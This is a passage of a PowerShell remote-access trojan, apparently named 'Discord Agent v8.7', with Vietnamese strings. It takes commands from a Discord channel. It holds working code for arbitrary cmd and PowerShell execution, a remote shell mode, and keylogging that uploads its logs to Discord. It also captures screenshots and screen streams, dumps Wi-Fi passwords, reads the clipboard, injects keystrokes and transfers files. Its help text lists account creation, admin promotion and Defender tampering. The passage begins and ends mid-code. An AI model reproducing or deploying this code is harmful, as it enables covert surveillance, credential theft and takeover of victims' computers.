    }
}

function Stop-KeyLog {
    if (-not $script:keylogPid) {
        if (Test-Path -LiteralPath $script:keylogPidFile) {
            try { $script:keylogPid = [int](Get-Content -LiteralPath $script:keylogPidFile -Raw) } catch { }
        }
        if (-not $script:keylogPid) { return "not running" }
    }
    $oldPid = $script:keylogPid
    "stop" | Set-Content -LiteralPath $script:keylogKillFile -Force
    Start-Sleep -Milliseconds 800
    $p = Get-Process -Id $oldPid -EA SilentlyContinue
    if ($p) { try { & taskkill.exe /F /T /PID $oldPid 2>&1 | Out-Null } catch { try { $p.Kill() } catch {} } }
    $script:keylogPid   = $null
    $script:keylogStart = $null
    Remove-Item -LiteralPath $script:keylogPidFile -Force -EA SilentlyContinue
    Remove-Item -LiteralPath $script:keylogKillFile -Force -EA SilentlyContinue
    return "stopped PID $oldPid"
}

# ==================== ROUTING ====================
function Get-MessageTarget {
    param([string]$Content)
    if ($Content -match '^@all\s+([\s\S]*)$')    { return @{ Target='all'; Cmd=$Matches[1] } }
    if ($Content -match '^@(\S+)\s+([\s\S]*)$') {
        $h = $Matches[1]
        if ($h -eq '*') { return @{ Target='all'; Cmd=$Matches[2] } }
        if ($h.ToLower() -eq 'me') { return @{ Target='me'; Cmd=$Matches[2] } }
        if ($h.ToLower() -eq $script:pcName.ToLower()) { return @{ Target='me'; Cmd=$Matches[2] } }
        if ($h.ToLower() -eq $script:hostname.ToLower()) { return @{ Target='me'; Cmd=$Matches[2] } }
        return @{ Target='other'; Cmd=$Matches[2] }
    }
    if ($Content -match '^#([0-9a-fA-F]+)\s+([\s\S]*)$') {
        $id = $Matches[1].ToLower()
        if ($id -eq $script:machineId) { return @{ Target='me'; Cmd=$Matches[2] } }
        return @{ Target='other'; Cmd=$Matches[2] }
    }
    return @{ Target='all'; Cmd=$Content }
}

function Test-IsShellTarget {
    if ($script:shellTargets.Count -eq 0) { return $false }
    $n = $script:pcName.ToLower()
    $h = $script:hostname.ToLower()
    foreach ($t in $script:shellTargets) {
        $tl = $t.ToLower()
        if ($tl -eq 'all' -or $tl -eq '*' -or $tl -eq $n -or $tl -eq $h) { return $true }
    }
    return $false
}

function Send-Heartbeat {
    try {
        $up = (Get-Date) - $script:startTime
        $adm = if (Test-Admin) { "admin" } else { "user" }
        $flag = if ($script:isSet) { "" } else { " *(chua setpc)*" }
        $sh = if ($script:shellMode) { " shell" } else { "" }
        $msg = "ON **$($script:pcName)** ``$($script:machineId)`` #$($script:instanceId) | up $([math]::Floor($up.TotalHours))h$($up.Minutes)m | $adm | cwd ``$($script:workDir)``$flag$sh"
        Send-DiscordMessage -Content $msg -NoTag
        $script:lastBeat = Get-Date
    } catch { }
}

function Resolve-ShellLine {
    param([string]$Line, [string]$MsgId)
    $Line = ([string]$Line).Trim()
    if (-not $Line) { return }
    if ($Line -match '^(\S+)\s*([\s\S]*)$') { $first = $Matches[1]; $rest = $Matches[2] }
    else { $first = $Line; $rest = "" }
    $lname = $first.ToLower()

    if ($lname -in @("cd","chdir","pushd","popd")) {
        $target = $rest.Trim().Trim('"').Trim("'")
        if ($lname -eq "popd") { $target = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
        if ($lname -in @("cd","chdir","pushd") -and -not $target) { Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId; return }
        try {
            if ($target -eq "..") { $new = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
            elseif ($target -eq ".") { $new = $script:workDir }
            elseif ($target -match '^[A-Za-z]:$') { $new = "$target\" }
            elseif ([System.IO.Path]::IsPathRooted($target)) { $new = [System.IO.Path]::GetFullPath($target) }
            else { $new = [System.IO.Path]::GetFullPath((Join-Path $script:workDir $target)) }
            if (Test-Path -LiteralPath $new -PathType Container) { $script:workDir = (Get-Item -LiteralPath $new).FullName; Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId }
            else { Send-DiscordMessage -Content "not found: ``$new``" -ReplyToId $MsgId }
        } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $MsgId }
        return
    }
    if ($lname -eq "pwd") { Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId; return }
    if ($lname -in @("exit","quit")) { $script:shellMode = $false; Send-DiscordMessage -Content "shell OFF" -ReplyToId $MsgId; return }
    if ($lname -in @("cls","clear")) { Send-DiscordMessage -Content "cleared" -ReplyToId $MsgId; return }
    if ($lname -in @("ls","ll","la")) { $f = if ($lname -eq "la") { "/a" } else { "" }; $out = Invoke-CmdCommand -Command "dir $f $rest".Trim(); Send-CodeBlock -Title "$($script:pcName)> $Line" -Body $out -ReplyToId $MsgId; return }
    if ($lname -in @("cat","less","more")) { $out = Invoke-CmdCommand -Command "type $rest"; Send-CodeBlock -Title "cat" -Body $out -ReplyToId $MsgId; return }
    if ($lname -eq "cp") { $out = Invoke-CmdCommand -Command "copy $rest"; Send-CodeBlock -Title "cp" -Body $out -ReplyToId $MsgId; return }
    if ($lname -eq "mv") { $out = Invoke-CmdCommand -Command "move $rest"; Send-CodeBlock -Title "mv" -Body $out -ReplyToId $MsgId; return }
    if ($lname -eq "rm") { $out = Invoke-CmdCommand -Command "del /q $rest"; Send-CodeBlock -Title "rm" -Body $out -ReplyToId $MsgId; return }
    if ($lname -in @("rmdir","rd")) { $out = Invoke-CmdCommand -Command "rmdir /s /q $rest"; Send-CodeBlock -Title "rmdir" -Body $out -ReplyToId $MsgId; return }
    if ($lname -in @("mkdir","md")) { $out = Invoke-CmdCommand -Command "mkdir $rest"; Send-CodeBlock -Title "mkdir" -Body $out -ReplyToId $MsgId; return }
    if ($lname -eq "echo") { if ($rest -eq "." -or $rest -eq "") { Send-DiscordMessage -Content "(blank)" -ReplyToId $MsgId } else { Send-DiscordMessage -Content $rest -ReplyToId $MsgId }; return }
    if ($lname -eq "help") { Send-DiscordMessage -Content "go !help" -ReplyToId $MsgId; return }
    $out = Invoke-CmdCommand -Command $Line
    Send-CodeBlock -Title "$($script:pcName)> $Line" -Body $out -ReplyToId $MsgId
}

$HELP_TEXT = @'
**AGENT v8.7**
**SHELL:** ``!shellon [PC...]`` ``!shelloff`` ``!shells``
**ROUTE:** ``@all`` ``@PC1`` ``@me`` ``#<id>``
**BOT:** ``!help`` ``!ping`` ``!id`` ``!instance`` ``!setpc`` ``!bot_info`` ``!beat`` ``!silent on|off``
**FILE:** ``!upload`` ``!send`` ``!download <url>`` ``!dl`` ``!save`` ``!edit`` ``!listfiles`` ``!screenshot`` ``!grab``
**CAPTURE:** ``!capture [fps] [q] [sec] [mon]`` (sec=0 = infinite) | ``!capture stop`` | ``!capture status`` | ``!capture err`` | ``!capture list``
**INPUT:** ``!sendkey <text>`` | ``!keys <text>``
**KLOG:** ``!keylog`` (start) | ``!keystop`` (stop + upload) | ``!keystat`` | ``!keylog clear``
**SYS:** ``!sysinfo`` ``!cpu`` ``!ram`` ``!disk`` ``!gpu`` ``!processes`` ``!services`` ``!whoami_all``
**NET:** ``!ipconfig`` ``!netstat`` ``!wifipass`` ``!pubip`` ``!ping_net`` ``!tracert`` ``!port``
**USER:** ``!netuser`` ``!netuser_add`` ``!netuser_passwd`` ``!promote_admin`` ``!netlocalgroup``
**PWR:** ``!lock`` ``!sleep`` ``!shutdown_sys`` ``!restart_sys`` ``!volume`` ``!msg <t>`` ``!speak <t>``
**REG/TASK:** ``!regread`` ``!regwrite`` ``!tasks`` ``!task_run``
**SEC:** ``!defender`` ``!av`` ``!takeown`` ``!icacls`` ``!sfc`` ``!chkdsk`` ``!bcdedit``
**WMIC:** ``!wmic_bios`` ``!wmic_cpu`` ``!wmic_disk`` ``!wmic_os`` ``!wmic_gpu`` ``!wmic_ram``
**EXEC:** ``!<cmd>`` | ``!cmd <cmd>`` | ``!ps <ps>``
'@

function Handle-Command {
    param($Message)
    try {
        if ($script:allowedUsers.Count -gt 0 -and $Message.author.id -notin $script:allowedUsers) { return }

        $raw    = [string]$Message.content
        $author = $Message.author.username
        $msgId  = $Message.id
        $trimmed = $raw.Trim()
        $hasAttach = ($Message.attachments -and $Message.attachments.Count -gt 0)

        $rt = Get-MessageTarget -Content $trimmed
        if ($rt.Target -eq 'other') { return }
        $cmdText = ([string]$rt.Cmd).Trim()
        if (-not $cmdText -and -not $hasAttach) { return }
        $firstTok = ""
        if ($cmdText -match '^(\S+)') { $firstTok = $Matches[1].ToLower() }
        $cmd = $null
        if ($cmdText -match '^[!/]') { $cmd = ($cmdText -replace '^[!/]', '').Trim() }
        elseif ($script:shellMode -and (Test-IsShellTarget) -and $cmdText) {
            if ($firstTok -in $script:botOnlyCommands) { $cmd = $cmdText }
            else {
                $ts = Get-Date -Format 'HH:mm:ss'
                [void]$script:history.Add("[$ts] ${author}: $cmdText")
                while ($script:history.Count -gt $script:historyMax) { $script:history.RemoveAt(0) }
                Resolve-ShellLine -Line $cmdText -MsgId $msgId
                return
            }
        } else {
            if ($cmdText -match '^(hi|hello|chao|hey)$') { Send-DiscordMessage -Content "hi $author" -ReplyToId $msgId; return }
            if ($hasAttach -and $rt.Target -eq 'me') {
                $sv = Download-DiscordAttachment -Message $Message
                if ($sv.Count -gt 0) { Send-DiscordMessage -Content "saved: " + (($sv | ForEach-Object { "``$_``" }) -join ", ") -ReplyToId $msgId }
            }
            return
        }
        if (-not $cmd -and -not $hasAttach) { return }
        if ($cmd -match '^(\S+)\s*([\s\S]*)$') { $name = $Matches[1].ToLower(); $cmdArgs = $Matches[2] }
        else { $name = $cmd.ToLower(); $cmdArgs = "" }
        $ts = Get-Date -Format 'HH:mm:ss'
        [void]$script:history.Add("[$ts] ${author}: $cmd")
        while ($script:history.Count -gt $script:historyMax) { $script:history.RemoveAt(0) }

        switch ($name) {
            "help"  { Send-DiscordMessage -Content $HELP_TEXT -ReplyToId $msgId; return }
            "ping"  { Send-DiscordMessage -Content "pong" -ReplyToId $msgId; return }
            "id"    { Send-DiscordMessage -Content "ID: ``$($script:machineId)```nName: ``$($script:pcName)```nHost: ``$($script:hostname)```nInstance: #$($script:instanceId) ($(if($script:isActive){'ACTIVE'}else{'BACKUP'}))`nPID: $($script:myPid)" -ReplyToId $msgId; return }
            "instance" { Send-DiscordMessage -Content "Instance #$($script:instanceId) | **$(if($script:isActive){'ACTIVE'}else{'BACKUP'})** | PID $($script:myPid)`nMutex: ``$($script:mutexName)``" -ReplyToId $msgId; return }
            "instances" { Send-DiscordMessage -Content "Instance #$($script:instanceId) | $(if($script:isActive){'ACTIVE'}else{'BACKUP'})" -ReplyToId $msgId; return }
            "getpc" { Send-DiscordMessage -Content "PC: **$($script:pcName)** ``$($script:machineId)```nHost: ``$($script:hostname)```nSet: $(if($script:isSet){'yes'}else{'no'})" -ReplyToId $msgId; return }
            "setpc" {
                if (-not $cmdArgs) { Send-DiscordMessage -Content "usage: !setpc <name>" -ReplyToId $msgId; return }
                $n = ($cmdArgs.Trim() -split '\s+')[0]
                $script:pcName = $n; $script:isSet = $true
                $script:tag = "[$($script:pcName):$($script:machineId)]"
                Save-Config @{ name = $n; id = $script:machineId; host = $script:hostname }
                Send-DiscordMessage -Content "Ten: **$n**" -ReplyToId $msgId; return
            }
            "whoami"{ Send-DiscordMessage -Content "``$env:USERDOMAIN\$env:USERNAME`` admin=$(if(Test-Admin){'Y'}else{'N'})" -ReplyToId $msgId; return }
            "bot_info" {
                $up = (Get-Date) - $script:startTime
                $i  = "**$($script:pcName)** ``$($script:machineId)`` #$($script:instanceId) | v8.7`n"
                $i += "up $([math]::Floor($up.TotalHours))h$($up.Minutes)m | admin: $(if(Test-Admin){'Y'}else{'N'})`n"
                $i += "Status: **$(if($script:isActive){'ACTIVE'}else{'BACKUP'})** | PID $($script:myPid)`n"
                $i += "cwd ``$($script:workDir)``"
                Send-DiscordMessage -Content $i -ReplyToId $msgId; return
            }
            "uptime" { $up=(Get-Date)-$script:startTime; Send-DiscordMessage -Content "up $([math]::Floor($up.TotalHours))h$($up.Minutes)m" -ReplyToId $msgId; return }
            "shutdown" { Send-DiscordMessage -Content "bot off" -ReplyToId $msgId; Start-Sleep 1; $script:running = $false; return }
            "history" { if ($script:history.Count -eq 0) { Send-DiscordMessage -Content "empty" -ReplyToId $msgId; return }; Send-CodeBlock -Title "history" -Body (($script:history | Select-Object -Last 20) -join "`n") -ReplyToId $msgId; return }
            "clearhist" { $script:history.Clear(); Send-DiscordMessage -Content "cleared" -ReplyToId $msgId; return }
            "cwd" { Send-DiscordMessage -Content "``$($script:workDir)``" -ReplyToId $msgId; return }
            "cd" {
                if (-not $cmdArgs) { Send-DiscordMessage -Content "``$($script:workDir)``" -ReplyToId $msgId; return }
                try {
                    $t = $cmdArgs.Trim().Trim('"')
                    if ($t -eq "..") { $n = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
                    elseif ($t -match '^[A-Za-z]:$') { $n = "$t\" }
                    elseif ([System.IO.Path]::IsPathRooted($t)) { $n = [System.IO.Path]::GetFullPath($t) }
                    else { $n = [System.IO.Path]::GetFullPath((Join-Path $script:workDir $t)) }
                    if (Test-Path -LiteralPath $n -PathType Container) { $script:workDir = (Get-Item -LiteralPath $n).FullName; Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $msgId }
                    else { Send-DiscordMessage -Content "not found" -ReplyToId $msgId }
                } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
                return
            }
            "shell" {
                $s = $cmdArgs.Trim().ToLower()
                if ($s -eq "on") { $script:shellMode = $true; Send-DiscordMessage -Content "shell ON" -ReplyToId $msgId }
                elseif ($s -eq "off") { $script:shellMode = $false; Send-DiscordMessage -Content "shell OFF" -ReplyToId $msgId }
                else { Send-DiscordMessage -Content "shell: $(if($script:shellMode){'ON'}else{'OFF'})" -ReplyToId $msgId }
                return
            }
            "shellon" {
                $script:shellTargets.Clear()
                if (-not $cmdArgs) { [void]$script:shellTargets.Add('all') }
                else { foreach ($t in ($cmdArgs.Trim() -split '\s+')) { if ($t) { [void]$script:shellTargets.Add($t) } } }
                if (Test-IsShellTarget) { $script:shellMode = $true; Send-DiscordMessage -Content "**$($script:pcName)** shell ON | targets: ``$($script:shellTargets -join ', ')``" -ReplyToId $msgId }
                else { $script:shellMode = $false }
                return
            }
            "shelloff" {
                $isTarget = $true
                if ($cmdArgs) {
                    $isTarget = $false
                    foreach ($t in ($cmdArgs.Trim() -split '\s+')) {
                        $tl = $t.ToLower()
                        if ($tl -eq 'all' -or $tl -eq '*' -or $tl -eq $script:pcName.ToLower() -or $tl -eq $script:hostname.ToLower()) { $isTarget = $true; break }
                    }
                }
                if ($isTarget) {
                    $script:shellMode = $false; $script:shellTargets.Clear()
                    Send-DiscordMessage -Content "**$($script:pcName)** shell OFF" -ReplyToId $msgId
                }
                return
            }
            "shells" { if ($script:shellMode) { Send-DiscordMessage -Content "**$($script:pcName)** in shell | ``$($script:shellTargets -join ', ')``" -ReplyToId $msgId }; return }
            "silent" { $s = $cmdArgs.Trim().ToLower(); if ($s -eq "off") { $script:silent = $false; Send-DiscordMessage -Content "loud" -ReplyToId $msgId } else { $script:silent = $true; Send-DiscordMessage -Content "silent" -ReplyToId $msgId }; return }
            "beat" { Send-Heartbeat; Send-DiscordMessage -Content "beat" -ReplyToId $msgId; return }

            "screenshot" { $path = Join-Path $env:TEMP "s_$(Get-Date -Format 'HHmmss').png"; if (Take-Screenshot -Path $path) { Send-DiscordFile -FilePath $path -Content "screenshot" -ReplyToId $msgId; Remove-Item $path -Force -EA SilentlyContinue } else { Send-DiscordMessage -Content "screenshot fail" -ReplyToId $msgId }; return }

            "capture" {
                $sub = ""
                if ($cmdArgs) { $sub = ($cmdArgs.Trim() -split '\s+')[0].ToLower() }

                if ($sub -eq "stop" -or $sub -eq "off") {
                    Send-DiscordMessage -Content (Stop-CaptureStream) -ReplyToId $msgId
                    return
                }
                if ($sub -eq "status") {
                    $p = $null
                    if ($script:capturePid) { $p = Get-Process -Id $script:capturePid -EA SilentlyContinue }
                    if (-not $p -and (Test-Path -LiteralPath $script:capturePidFile)) {
                        try { $pid2 = [int](Get-Content -LiteralPath $script:capturePidFile -Raw); $p = Get-Process -Id $pid2 -EA SilentlyContinue } catch { }
                    }
                    if ($p) {
                        $elapsed = if ($script:captureStart) { [int]((Get-Date) - $script:captureStart).TotalSeconds } else { "?" }
                        Send-DiscordMessage -Content "Running | PID $($p.Id) | ${elapsed}s elapsed" -ReplyToId $msgId
                    } else {
                        Send-DiscordMessage -Content "Not running" -ReplyToId $msgId
                    }
                    return
                }
                if ($sub -eq "err" -or $sub -eq "log") {
                    if (-not (Test-Path -LiteralPath $script:captureErrFile)) {
                        Send-DiscordMessage -Content "No err log" -ReplyToId $msgId
                        return
                    }
                    $tail = Get-Content -LiteralPath $script:captureErrFile -Tail 50 -Encoding UTF8
                    Send-CodeBlock -Title "capture err log" -Body ($tail -join "`n") -ReplyToId $msgId
                    return
                }
                if ($sub -eq "list") {
                    Add-Type -AssemblyName System.Windows.Forms
                    $screens = [System.Windows.Forms.Screen]::AllScreens
                    $lines = @("**0** = ALL (virtual screen)")
                    for ($i = 0; $i -lt $screens.Count; $i++) {
                        $s = $screens[$i]
                        $primary = if ($s.Primary) { " [PRIMARY]" } else { "" }
                        $lines += "**$($i+1)** : $($s.Bounds.Width)x$($s.Bounds.Height) @ ($($s.Bounds.X),$($s.Bounds.Y))$primary"
                    }
                    Send-CodeBlock -Title "Monitors" -Body ($lines -join "`n") -ReplyToId $msgId
                    return
                }
                $parts = if ($cmdArgs) { $cmdArgs.Trim() -split '\s+' } else { @() }
                $fps = 1; $q = 60; $sec = 0; $mon = 0
                try { if ($parts.Count -ge 1 -and $parts[0]) { $fps = [int]$parts[0] } } catch { }
                try { if ($parts.Count -ge 2 -and $parts[1]) { $q   = [int]$parts[1] } } catch { }
                try { if ($parts.Count -ge 3 -and $parts[2]) { $sec = [int]$parts[2] } } catch { }
                try { if ($parts.Count -ge 4 -and $parts[3]) { $mon = [int]$parts[3] } } catch { }
                if ($fps -lt 1) { $fps = 1 }; if ($fps -gt 2) { $fps = 2 }
                if ($q -lt 20) { $q = 20 }; if ($q -gt 90) { $q = 90 }
                if ($sec -lt 0) { $sec = 0 }
                if ($sec -gt 0 -and $sec -lt 5) { $sec = 5 }
                $r = Start-CaptureStream -Fps $fps -Quality $q -MaxSeconds $sec -Monitor $mon
                Send-DiscordMessage -Content "$r`n``!capture stop`` | ``!capture status`` | ``!capture err`` | ``!capture list``" -ReplyToId $msgId
                return
            }

            "sendkey" {
                if (-not $cmdArgs) { Send-DiscordMessage -Content "usage: !sendkey <text>" -ReplyToId $msgId; return }
                $payload = $cmdArgs
                $escaped = $payload -replace "'", "''"
                $cmd = "`$w = New-Object -ComObject WScript.Shell; `$w.SendKeys('$escaped')"
                Invoke-PSCommand -Command $cmd | Out-Null
                Send-DiscordMessage -Content "Sent: ``$payload``" -ReplyToId $msgId
                return
            }

            "keylog" {
                $sub = ""
                if ($cmdArgs) { $sub = ($cmdArgs.Trim() -split '\s+')[0].ToLower() }
                if ($sub -eq "clear") {
                    Remove-Item -LiteralPath $script:keylogLogFile -Force -EA SilentlyContinue
                    Send-DiscordMessage -Content "Log cleared" -ReplyToId $msgId
                    return
                }
                $r = Start-KeyLog
                Send-DiscordMessage -Content "$r`nDung: ``!keystop`` | Check: ``!keystat``" -ReplyToId $msgId
                return
            }

            "keystop" {
                if (-not $script:keylogPid -and -not (Test-Path -LiteralPath $script:keylogPidFile)) {
                    Send-DiscordMessage -Content "Keylog not running" -ReplyToId $msgId
                    return
                }
                $stopMsg = Stop-KeyLog
                Send-DiscordMessage -Content $stopMsg -ReplyToId $msgId
                if (Test-Path -LiteralPath $script:keylogLogFile) {
                    $size = (Get-Item $script:keylogLogFile).Length
                    if ($size -gt 0) {
                        if ($size -gt ($script:maxUploadMB * 1MB)) {
                            $tail = Get-Content $script:keylogLogFile -Tail 2000 -Encoding UTF8
                            Send-CodeBlock -Title "keylog (tail)" -Body ($tail -join "`n") -ReplyToId $msgId
                        } else {
                            Send-DiscordFile -FilePath $script:keylogLogFile -Content "keylog ($size bytes)" -ReplyToId $msgId
                        }
                    } else {
                        Send-DiscordMessage -Content "Log empty" -ReplyToId $msgId
                    }
                } else {
                    Send-DiscordMessage -Content "Log file not found" -ReplyToId $msgId
                }
                return
            }

            "keystat" {
                $p = $null
                if ($script:keylogPid) { $p = Get-Process -Id $script:keylogPid -EA SilentlyContinue }
                if (-not $p -and (Test-Path -LiteralPath $script:keylogPidFile)) {
                    try { $pid2 = [int](Get-Content -LiteralPath $script:keylogPidFile -Raw); $p = Get-Process -Id $pid2 -EA SilentlyContinue } catch { }
                }
                if ($p) {
                    $elapsed = if ($script:keylogStart) { [int]((Get-Date) - $script:keylogStart).TotalSeconds } else { "?" }
                    $size = if (Test-Path $script:keylogLogFile) { (Get-Item $script:keylogLogFile).Length } else { 0 }
                    Send-DiscordMessage -Content "Running | PID $($p.Id) | ${elapsed}s | log $size bytes" -ReplyToId $msgId
                } else {
                    $size = if (Test-Path $script:keylogLogFile) { (Get-Item $script:keylogLogFile).Length } else { 0 }
                    Send-DiscordMessage -Content "Not running | log $size bytes" -ReplyToId $msgId
                }
                return
            }

            "upload" { if (-not $cmdArgs) { return }; $p = $cmdArgs.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($p)) { $p = Join-Path $script:workDir $p }; Send-DiscordFile -FilePath $p -Content "upload" -ReplyToId $msgId; return }
            "send" { if (-not $cmdArgs) { return }; $p = $cmdArgs.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($p)) { $p = Join-Path $script:workDir $p }; Send-DiscordFile -FilePath $p -Content "send" -ReplyToId $msgId; return }
            "getfile" { if (-not $cmdArgs) { return }; $p = $cmdArgs.Trim().Trim('"'); if (-not [System.IO.Path]::IsPathRooted($p)) { $p = Join-Path $script:workDir $p }; Send-DiscordFile -FilePath $p -Content "getfile" -ReplyToId $msgId; return }
            "download" {
                if (-not $cmdArgs) { return }
                $parts = $cmdArgs.Trim() -split '\s+', 2
                $url = $parts[0]
                try { $u = [uri]$url } catch { Send-DiscordMessage -Content "invalid URL" -ReplyToId $msgId; return }
                $sp = if ($parts.Count -gt 1) { $parts[1].Trim().Trim('"') } else { $n = [System.IO.Path]::GetFileName($u.LocalPath); if (-not $n) { $n = "dl_$(Get-Date -Format 'HHmmss')" }; $n }
                if (-not [System.IO.Path]::IsPathRooted($sp)) { $sp = Join-Path $script:workDir $sp }
                try { Invoke-WebRequest -Uri $url -OutFile $sp -UseBasicParsing; Send-DiscordMessage -Content "``$sp``" -ReplyToId $msgId } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
                return
            }
            "dl" {
                if (-not $cmdArgs) { return }
                $url = ($cmdArgs.Trim() -split '\s+')[0]
                try { $u = [uri]$url } catch { Send-DiscordMessage -Content "invalid URL" -ReplyToId $msgId; return }
                $n = [System.IO.Path]::GetFileName($u.LocalPath); if (-not $n) { $n = "dl_$(Get-Date -Format 'HHmmss')" }
                $sp = Join-Path $script:workDir $n
                try { Invoke-WebRequest -Uri $url -OutFile $sp -UseBasicParsing; Send-DiscordMessage -Content "``$sp``" -ReplyToId $msgId } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
                return
            }
            "cmd"    { if (-not $cmdArgs) { return }; $r = Invoke-CmdCommand -Command $cmdArgs; Send-CodeBlock -Title "cmd" -Body $r -ReplyToId $msgId; return }
            "ps_cmd" { if (-not $cmdArgs) { return }; $r = Invoke-PSCommand -Command $cmdArgs; Send-CodeBlock -Title "ps" -Body $r -ReplyToId $msgId; return }
            "run"    { if (-not $cmdArgs) { return }; $r = Invoke-CmdCommand -Command $cmdArgs; Send-CodeBlock -Title "run" -Body $r -ReplyToId $msgId; return }
            "ps"     { $r = Invoke-PSCommand -Command 'Get-Process|Sort-Object CPU -Descending|Select-Object -First 30 Name,Id,CPU,WS|Format-Table -AutoSize'; Send-CodeBlock -Title "proc" -Body $r -ReplyToId $msgId; return }
            "sysinfo"{ $r = Invoke-PSCommand -Command 'Get-CimInstance Win32_OperatingSystem|Select-Object Caption,Version,LastBootUpTime|Format-List'; Send-CodeBlock -Title "sysinfo" -Body $r -ReplyToId $msgId; return }
            "cpu"    { $r = Invoke-PSCommand -Command 'Get-CimInstance Win32_Processor|Format-List Name,NumberOfCores,NumberOfLogicalProcessors'; Send-CodeBlock -Title "cpu" -Body $r -ReplyToId $msgId; return }
            "ram"    { $r = Invoke-PSCommand -Command '$o=Get-CimInstance Win32_OperatingSystem;"Total: {0:N2} GB / Free: {1:N2} GB" -f ($o.TotalVisibleMemorySize/1MB),($o.FreePhysicalMemory/1MB)'; Send-CodeBlock -Title "ram" -Body $r -ReplyToId $msgId; return }
            "disk"   { $r = Invoke-PSCommand -Command 'Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"|ForEach-Object{"{0}: {1:N1} GB free / {2:N1} GB" -f $_.DeviceID,($_.FreeSpace/1GB),($_.Size/1GB)}'; Send-CodeBlock -Title "disk" -Body $r -ReplyToId $msgId; return }
            "ipconfig" { $r = Invoke-CmdCommand -Command "ipconfig /all"; Send-CodeBlock -Title "ipconfig" -Body $r -ReplyToId $msgId; return }
            "netstat"  { $r = Invoke-CmdCommand -Command "netstat -ano"; Send-CodeBlock -Title "netstat" -Body $r -ReplyToId $msgId; return }
            "wifipass" { $r = Get-WifiPasswords; Send-CodeBlock -Title "wifi pass" -Body $r -ReplyToId $msgId; return }
            "admin"  { Send-DiscordMessage -Content "admin: $(if(Test-Admin){'yes'}else{'no'})" -ReplyToId $msgId; return }
            "keys"   { if (-not $cmdArgs) { return }; $esc = $cmdArgs -replace "'","''"; Invoke-PSCommand -Command "`$w=New-Object -ComObject WScript.Shell;`$w.SendKeys('$esc')" | Out-Null; Send-DiscordMessage -Content "keys sent" -ReplyToId $msgId; return }
            "clipboard_get" { $r = Invoke-PSCommand -Command "Get-Clipboard"; Send-CodeBlock -Title "clip" -Body $r -ReplyToId $msgId; return }
            "clipboard_set" { if (-not $cmdArgs) { return }; Invoke-PSCommand -Command "Set-Clipboard '$cmdArgs'" | Out-Null; Send-DiscordMessage -Content "ok" -ReplyToId $msgId; return }
            "lock"   { Invoke-CmdCommand -Command "rundll32.exe user32.dll,LockWorkStation" | Out-Null; Send-DiscordMessage -Content "locked" -ReplyToId $msgId; return }
            "shutdown_sys" { Invoke-CmdCommand -Command "shutdown /s /t 5" | Out-Null; Send-DiscordMessage -Content "off 5s" -ReplyToId $msgId; return }
            "restart_sys"  { Invoke-CmdCommand -Command "shutdown /r /t 5" | Out-Null; Send-DiscordMessage -Content "restart 5s" -ReplyToId $msgId; return }
            "msg"    { if (-not $cmdArgs) { return }; Invoke-PSCommand -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('$cmdArgs','Msg')" | Out-Null; Send-DiscordMessage -Content "msg" -ReplyToId $msgId; return }
            "speak"  { if (-not $cmdArgs) { return }; Invoke-PSCommand -Command "Add-Type -AssemblyName System.Speech;`$s=New-Object System.Speech.Synthesis.SpeechSynthesizer;`$s.Speak('$cmdArgs')" | Out-Null; Send-DiscordMessage -Content "speak" -ReplyToId $msgId; return }
            "beep"   { Invoke-PSCommand -Command '[console]::beep(1000,500)' | Out-Null; Send-DiscordMessage -Content "beep" -ReplyToId $msgId; return }

            default {
                if (-not $cmd -and $hasAttach) {
                    $sv = Download-DiscordAttachment -Message $Message
                    if ($sv.Count -gt 0) { Send-DiscordMessage -Content "saved: " + (($sv | ForEach-Object { "``$_``" }) -join ", ") -ReplyToId $msgId }
                    return
                }
                $d = Test-Dangerous -Command $cmd
                if ($d) { Send-DiscordMessage -Content "REFUSED: $d" -ReplyToId $msgId; return }
                $r = Invoke-CmdCommand -Command $cmd
                Send-CodeBlock -Title "$($script:pcName)> $cmd" -Body $r -ReplyToId $msgId
                return
            }
        }
    } catch {
        Log "[ERR] $($_.Exception.Message)" "Red"
        try { Send-DiscordMessage -Content "err: $($_.Exception.Message)" -ReplyToId $Message.id } catch {}
    }
}

# ==================== MAIN ====================
LogA "============================================" "Cyan"
LogA " DISCORD AGENT v8.7" "Cyan"
LogA "============================================" "Cyan"
LogA " Name:     $($script:pcName)" "White"
LogA " ID:       $($script:machineId)" "White"
LogA " Host:     $($script:hostname)" "White"
LogA " Instance: #$($script:instanceId)" "White"
LogA " PID:      $($script:myPid)" "White"
LogA " Mutex:    $($script:mutexName)" "White"
LogA "============================================" "Cyan"

if (-not $script:mutex) { LogA "Khong tao duoc mutex - thoat." "Red"; exit 1 }

$script:isActive = Try-Acquire
if (-not $script:isActive) {
    LogA ""
    LogA "BACKUP MODE" "Yellow"
    while ($script:running -and -not $script:isActive) {
        Start-Sleep -Seconds $script:backupTick
        if (Try-Acquire) { $script:isActive = $true; LogA "LOCK ACQUIRED" "Green"; break }
    }
    if (-not $script:isActive) { Release-Lock; exit 0 }
}

LogA "ACTIVE MODE" "Green"

try {
    $me = Invoke-RestMethod -Uri "https://discord.com/api/v10/users/@me" -Headers $headers -Method Get
    LogA "Bot: $($me.username)" "Green"
} catch { LogA "API fail: $_" "Red"; Release-Lock; exit 1 }

try {
    $latest = Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$($script:channelId)/messages?limit=1" -Headers $headers
    if ($latest) {
        $first = if ($latest -is [array]) { $latest[0] } else { $latest }
        if ($first -and $first.id) { $script:lastMessageId = [string]$first.id }
    }
} catch { }

Send-Heartbeat

try {
    while ($script:running) {
        try {
            if (-not $script:isActive) { break }
            $collected = New-Object System.Collections.ArrayList
            $cursor = $script:lastMessageId
            $firstPass = [string]::IsNullOrEmpty($cursor)
            do {
